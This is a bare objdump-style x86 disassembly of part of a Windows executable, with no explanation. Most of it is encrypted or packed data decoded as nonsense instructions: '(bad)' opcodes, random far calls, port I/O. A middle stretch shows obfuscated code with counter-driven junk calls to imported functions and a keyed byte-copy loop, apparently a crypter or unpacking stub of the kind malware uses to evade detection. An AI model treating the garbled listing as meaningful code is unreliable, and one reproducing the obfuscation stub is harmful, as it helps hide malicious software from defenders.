  40396c:	div    BYTE PTR [ebx+0x710bf9f3]
  403972:	or     DWORD PTR [ebp+0x49],ebp
  403975:	bound  eax,QWORD PTR [esp+esi*1+0x361ed573]
  40397c:	ror    bh,cl
  40397e:	sub    BYTE PTR [edx-0x62b1cf71],bh
  403984:	jb     0x4039f5
  403986:	loopne 0x403992
  403988:	(bad)  
  403989:	(bad)  
  40398a:	scas   eax,DWORD PTR es:[edi]
  40398b:	ror    DWORD PTR [ebp-0x17],cl
  40398e:	pop    esp
  40398f:	fcmovbe st,st(6)
  403991:	dec    edi
  403992:	sub    DWORD PTR [ebx-0x226b8f4a],0xb4cc9d81
  40399c:	retf   
  40399d:	nop
  40399e:	call   0x2370:0xafc406c2
  4039a5:	inc    edi
  4039a6:	inc    esi
  4039a7:	adc    al,0xa4
  4039a9:	int3   
  4039aa:	mov    eax,0xda7d8fb2
  4039af:	dec    esp
  4039b0:	les    edx,FWORD PTR [eax+0xd]
  4039b3:	xchg   edi,eax
  4039b4:	outs   dx,DWORD PTR ds:[esi]
  4039b5:	cli    
  4039b6:	and    esi,ebp
  4039b8:	in     al,0xea
  4039ba:	fnstsw WORD PTR [ebx+0x8d7c7ec]
  4039c0:	mov    al,0x81
  4039c2:	ss dec eax
  4039c4:	out    0xb4,eax
  4039c6:	sbb    cl,dh
  4039c8:	adc    DWORD PTR [eax+edx*2-0x4583684d],ecx
  4039cf:	mov    eax,ds:0x865e6299
  4039d4:	mov    cl,0xb7
  4039d6:	pop    edx
  4039d7:	out    dx,eax
  4039d8:	sbb    BYTE PTR [ecx],al
  4039da:	psrlq  mm0,QWORD PTR [esp+ebp*2+0x77906c7]
  4039e2:	xchg   edx,eax
  4039e3:	xor    edx,DWORD PTR [edx+0x12c3df9a]
  4039e9:	leave  
  4039ea:	test   DWORD PTR [esi+0x4c],0xabaa6ed4
  4039f1:	jno    0x403991
  4039f3:	mov    al,ds:0x2a326a53
  4039f8:	push   esp
  4039f9:	repz sbb eax,0x9ac274dc
  4039ff:	(bad)  
  403a00:	stc    
  403a01:	mov    edx,0xa86f6133
  403a06:	fistp  QWORD PTR ds:0x228eee72
  403a0c:	psrlq  mm5,QWORD PTR [esi+ebx*4]
  403a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a11:	dec    eax
  403a12:	mov    dl,0x4
  403a14:	loop   0x403a21
  403a16:	ds in  al,0x86
  403a19:	pop    esp
  403a1a:	adc    dh,cl
  403a1c:	loop   0x4039c2
  403a1e:	dec    ebp
  403a1f:	out    0x44,al
  403a21:	push   edx
  403a22:	fcomp  QWORD PTR [esi]
  403a24:	je     0x4039c0
  403a26:	dec    edx
  403a27:	xchg   ecx,eax
  403a28:	xchg   ebp,eax
  403a29:	fsubp  st(6),st
  403a2b:	cli    
  403a2c:	and    edi,ecx
  403a2e:	and    ecx,esi
  403a30:	dec    ebx
  403a31:	sub    BYTE PTR [eax],bl
  403a33:	ret    
  403a34:	dec    ecx
  403a35:	xor    dh,BYTE PTR [ebp+0x7b]
  403a38:	nop
  403a39:	xchg   edi,eax
  403a3a:	std    
  403a3b:	adc    al,0x36
  403a3d:	add    DWORD PTR ds:0x93fc28a4,ebp
  403a43:	fcomp  DWORD PTR [edx-0x57]
  403a46:	aad    0x60
  403a48:	jg     0x403a86
  403a4a:	sub    al,0xfc
  403a4c:	fisubr WORD PTR [eax]
  403a4e:	sti    
  403a4f:	jb     0x403a1c
  403a51:	mov    bl,0xdd
  403a53:	inc    ebx
  403a54:	inc    esp
  403a55:	or     edi,eax
  403a57:	dec    eax
  403a58:	retf   
  403a59:	fpatan 
  403a5b:	sar    BYTE PTR [edx-0x73],0xfe
  403a5f:	js     0x403ac9
  403a61:	push   ss
  403a62:	xchg   ebx,eax
  403a63:	fimul  DWORD PTR [ecx]
  403a65:	outs   dx,BYTE PTR ds:[esi]
  403a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a67:	fistp  WORD PTR [edi-0x33]
  403a6a:	aas    
  403a6b:	aam    0x21
  403a6d:	cmp    BYTE PTR [esi+0x271c7771],0x12
  403a74:	dec    eax
  403a75:	add    BYTE PTR [esi],dl
  403a77:	xor    al,0xa0
  403a79:	push   edi
  403a7a:	mov    dl,0xb3
  403a7c:	shl    ebx,0x78
  403a7f:	jne    0x403aa3
  403a81:	add    DWORD PTR ds:0xef113dfd,ebp
  403a87:	jno    0x403a7b
  403a89:	(bad)  
  403a8b:	and    al,0x95
  403a8d:	push   ecx
  403a8e:	adc    BYTE PTR [edi],0xc2
  403a91:	outs   dx,BYTE PTR ds:[esi]
  403a92:	adc    eax,0x850b5042
  403a97:	pop    ss
  403a98:	pop    ebp
  403a99:	push   ebp
  403a9a:	jns    0x403a48
  403a9c:	into   
  403a9d:	sub    al,0xbd
  403a9f:	sbb    BYTE PTR [edi-0x4b8e2e85],dl
  403aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403aa6:	inc    sp
  403aa8:	out    0xa8,eax
  403aaa:	lds    eax,FWORD PTR [ebp-0x70dc7cb9]
  403ab0:	scas   al,BYTE PTR es:[edi]
  403ab1:	loope  0x403b25
  403ab3:	jno    0x403ad2
  403ab5:	xchg   esi,ecx
  403ab7:	das    
  403ab8:	pop    edx
  403ab9:	retf   0x5f29
  403abc:	aam    0xe3
  403abe:	push   cs
  403abf:	jo     0x403af0
  403ac1:	xor    eax,0x9eb4526
  403ac6:	(bad)  
  403ac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ac8:	fcomp  st(7)
  403aca:	sbb    ch,BYTE PTR [edi-0x4271d3d]
  403ad0:	fmul   QWORD PTR [ebp+0xdf88fb7]
  403ad6:	js     0x403a7c
  403ad8:	inc    esi
  403ad9:	jle    0x403b59
  403adb:	outs   dx,DWORD PTR ds:[esi]
  403adc:	jg     0x403b1b
  403ade:	inc    ecx
  403adf:	pop    ebp
  403ae0:	stc    
  403ae1:	ds ins BYTE PTR es:[edi],dx
  403ae3:	mov    esi,DWORD PTR [ecx+0x39e75e1b]
  403ae9:	jne    0x403a85
  403aeb:	xor    DWORD PTR [edx+edi*2-0x6f903d9d],eax
  403af2:	adc    ebx,DWORD PTR [ecx]
  403af4:	pop    esp
  403af5:	sbb    eax,DWORD PTR [eax-0x61]
  403af8:	out    dx,eax
  403af9:	add    cl,BYTE PTR [esi+0x464fe675]
  403aff:	dec    eax
  403b00:	xor    BYTE PTR [eax],0x35
  403b03:	repnz dec ebp
  403b05:	out    dx,eax
  403b06:	(bad)  
  403b07:	call   FWORD PTR [edx-0x1f526d67]
  403b0d:	jl     0x403aa1
  403b0f:	and    DWORD PTR [ebp-0x2c],edx
  403b12:	fimul  WORD PTR [edi-0x78693c2]
  403b18:	popf   
  403b19:	outs   dx,DWORD PTR ds:[esi]
  403b1a:	xchg   edx,eax
  403b1b:	mov    ebx,0x7141b04d
  403b20:	sbb    DWORD PTR [ebp-0x17e2714d],ecx
  403b26:	cmp    dh,ch
  403b28:	xchg   ebx,eax
  403b29:	aas    
  403b2a:	push   edx
  403b2b:	scas   eax,DWORD PTR es:[edi]
  403b2c:	lea    eax,[ebx+ecx*8]
  403b2f:	(bad)  
  403b30:	stos   DWORD PTR es:[edi],eax
  403b31:	xchg   BYTE PTR [esp+ebp*1],dl
  403b34:	jbe    0x403acf
  403b36:	inc    edi
  403b37:	(bad)  
  403b38:	in     eax,0x9c
  403b3a:	pop    edi
  403b3b:	outs   dx,BYTE PTR ds:[esi]
  403b3c:	leave  
  403b3d:	pop    edx
  403b3e:	xchg   esp,eax
  403b3f:	inc    ecx
  403b40:	in     al,0xa9
  403b42:	outs   dx,DWORD PTR ds:[esi]
  403b43:	xor    al,0x87
  403b45:	int3   
  403b46:	fwait
  403b47:	adc    BYTE PTR [esi-0x54c50e19],dh
  403b4d:	dec    esi
  403b4e:	daa    
  403b4f:	call   0x8b5f:0x6873690d
  403b56:	daa    
  403b57:	imul   ebx,DWORD PTR fs:[ebx+0x34d96c9f],0xffffff99
  403b5f:	mov    ds:0x3ca4a0e5,al
  403b64:	(bad)  
  403b65:	fbld   TBYTE PTR [ecx+0x2c]
  403b68:	xchg   edx,eax
  403b69:	ret    0xc85b
  403b6c:	jle    0x403be9
  403b6e:	ja     0x403b4e
  403b70:	cmp    BYTE PTR [ebx],bh
  403b72:	sbb    BYTE PTR [esi+0x29d98766],ah
  403b78:	push   ebp
  403b79:	arpl   WORD PTR [edx+0x19],sp
  403b7c:	test   BYTE PTR [esi],ah
  403b7e:	mov    DWORD PTR [ebp-0x74],esp
  403b81:	xor    BYTE PTR [ecx+0x78f200a9],al
  403b87:	lods   eax,DWORD PTR ds:[esi]
  403b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b89:	sub    BYTE PTR [ebx+ebx*8+0x14cd5091],dh
  403b90:	pop    esi
  403b91:	icebp  
  403b92:	test   DWORD PTR [ebx+eiz*2],ecx
  403b95:	push   edx
  403b96:	into   
  403b97:	mov    ecx,0x3217becd
  403b9c:	mov    cs,WORD PTR ds:0x20fd365
  403ba2:	ins    DWORD PTR es:[edi],dx
  403ba3:	dec    esi
  403ba4:	(bad)  
  403ba5:	scas   al,BYTE PTR es:[edi]
  403ba6:	loop   0x403b89
  403ba8:	into   
  403ba9:	fwait
  403baa:	inc    edi
  403bab:	mov    ds:0x565650d0,eax
  403bb0:	outs   dx,DWORD PTR ds:[esi]
  403bb1:	and    BYTE PTR [edi-0x82ece17],al
  403bb7:	push   edi
  403bb8:	in     al,0x33
  403bba:	xchg   esp,eax
  403bbb:	fild   QWORD PTR [esp+eax*2-0x8]
  403bbf:	cmp    DWORD PTR [edx+0x6f],edi
  403bc2:	pop    edx
  403bc3:	and    eax,0x46953ffb
  403bc8:	lock sbb DWORD PTR [ecx+esi*8],edi
  403bcc:	aad    0x39
  403bce:	aaa    
  403bcf:	xchg   ecx,eax
  403bd0:	mov    ch,0x6a
  403bd2:	mov    bl,BYTE PTR [esi-0x3f]
  403bd5:	js     0x403b65
  403bd7:	(bad)  
  403bd8:	int    0x35
  403bda:	jb     0x403bd4
  403bdc:	mov    eax,0x8bccc5f7
  403be1:	xor    ebp,DWORD PTR [ebx-0x766a440b]
  403be7:	xor    DWORD PTR [eax-0x49f49f36],0xffffffec
  403bee:	mov    eax,ds:0xf78dc609
  403bf3:	pop    ebp
  403bf4:	ja     0x403c5b
  403bf6:	xchg   ecx,eax
  403bf7:	push   cs
  403bf8:	addr16 push ebp
  403bfa:	push   cs
  403bfb:	push   edi
  403bfc:	push   edx
  403bfd:	jns    0x403b83
  403bff:	adc    BYTE PTR [edx],bh
  403c01:	test   eax,0xbd68ee29
  403c06:	pop    esp
  403c07:	scas   al,BYTE PTR es:[edi]
  403c08:	rol    DWORD PTR [ebx],1
  403c0a:	jb     0x403c42
  403c0c:	push   cs
  403c0d:	add    al,0xa0
  403c0f:	sub    ecx,DWORD PTR [ecx+0x63]
  403c12:	cmp    ebx,DWORD PTR [eax-0xc]
  403c15:	sub    al,0xf7
  403c17:	pop    ebp
  403c18:	and    ebx,DWORD PTR [edx+0x40c3f60a]
  403c1e:	mov    ds:0x7b47c2a,al
  403c23:	add    al,0x57
  403c25:	jmp    0x403bb6
  403c27:	cli    
  403c28:	inc    esi
  403c29:	ins    DWORD PTR es:[edi],dx
  403c2a:	sub    eax,0x56fc39c3
  403c2f:	fsubr  st(4),st
  403c31:	jmp    0x403c48
  403c33:	les    edi,FWORD PTR ds:0x764f3e15
  403c39:	xchg   edx,eax
  403c3a:	in     eax,dx
  403c3b:	push   edx
  403c3c:	mov    WORD PTR [eax+ecx*8-0x15],gs
  403c40:	dec    eax
  403c41:	mov    BYTE PTR [esi-0x4cc25909],bh
  403c47:	stos   BYTE PTR es:[edi],al
  403c48:	sub    DWORD PTR [eax+0x16],esp
  403c4b:	push   0x84c7d9b1
  403c50:	fwait
  403c51:	ds test al,0x92
  403c54:	pop    ebp
  403c55:	sub    eax,0xb89d3107
  403c5b:	pop    edx
  403c5c:	test   eax,0xbc3c9436
  403c62:	aaa    
  403c63:	fstp   QWORD PTR [edi+0x17]
  403c66:	xchg   edx,eax
  403c67:	jne    0x403c0e
  403c69:	or     BYTE PTR [ecx+0x2e],ch
  403c6c:	jl     0x403cd5
  403c6e:	dec    edi
  403c6f:	test   DWORD PTR [ecx],ecx
  403c71:	mov    esp,0xb2229588
  403c76:	mov    cl,0xeb
  403c78:	lea    esp,[ebx]
  403c7a:	popf   
  403c7b:	jbe    0x403cae
  403c7d:	jle    0x403cc8
  403c7f:	retf   
  403c80:	xor    ecx,eax
  403c82:	mov    DWORD PTR [ebp+0x8],ecx
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d56c,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41fecf
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0x49c947b
  4042a6:	cwde   
  4042a7:	imul   ebx,DWORD PTR [ebp+0x1a],0x2a62625f
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx-0x4]
  4042b2:	stos   BYTE PTR es:[edi],al
  4042b3:	mov    ebp,0x6fa2c3e4
  4042b8:	shl    DWORD PTR [esi-0x2f017c5],cl
  4042be:	pushf  
  4042bf:	sti    
  4042c0:	rol    BYTE PTR [edi+0x29],cl
  4042c3:	and    DWORD PTR [esi*4-0x1661ffdc],edi
  4042ca:	test   BYTE PTR [ebx-0x1b944ea4],dh
  4042d0:	daa    
  4042d1:	dec    edi
  4042d2:	jae    0x40433c
  4042d4:	retf   0xaeff
  4042d7:	fidivr WORD PTR [edi+0x3903ea2f]
  4042dd:	inc    esi
  4042de:	mov    ch,0x93
  4042e0:	repnz std 
  4042e2:	outs   dx,DWORD PTR ds:[esi]
  4042e3:	sbb    al,0xff
  4042e5:	mov    ecx,0xe5846c8a
  4042ea:	mov    ?,WORD PTR [ebp-0x6580bbbd]
  4042f0:	cmp    esp,DWORD PTR [ebx]
  4042f2:	loope  0x404370
  4042f4:	ds sti 
  4042f6:	cmc    
  4042f7:	idiv   DWORD PTR [esi]
  4042f9:	xchg   DWORD PTR [edi],esp
  4042fb:	mov    dl,BYTE PTR [esi]
  4042fd:	bound  ecx,QWORD PTR [edx+0x50]
  404300:	neg    ah
  404302:	or     ebx,DWORD PTR [edi-0x45a14591]
  404308:	lock retf 
  40430a:	jmp    0x9fe4f628
  40430f:	mov    al,0x3
  404311:	dec    ecx
  404312:	jno    0x404338
  404314:	cs stos BYTE PTR es:[edi],al
  404316:	inc    ecx
  404317:	add    al,0x18
  404319:	int3   
  40431a:	cmp    eax,0x1d5bfb82
  40431f:	rol    DWORD PTR [ecx+ebp*4-0x2bc762e4],0xa2
  404327:	inc    ebx
  404328:	mov    esi,?
  40432a:	cdq    
  40432b:	jmp    FWORD PTR [ebp+0x23]
  40432e:	mov    ecx,0x7eb8397
  404333:	inc    ebp
  404334:	mov    al,ds:0x4d8e12f0
  404339:	mov    eax,0xee67c753
  40433e:	or     al,0xcc
  404340:	jmp    0xc302f93d
  404345:	mov    ds:0xa4e12e6f,eax
  40434a:	je     0x404314
  40434c:	pop    esp
  40434d:	js     0x4042ec
  40434f:	cli    
  404350:	push   0x56e76018
  404355:	fsubr  QWORD PTR [edi+0x4f]
  404358:	cmp    bl,BYTE PTR [ebx+esi*1+0x1e3784fa]
  40435f:	stc    
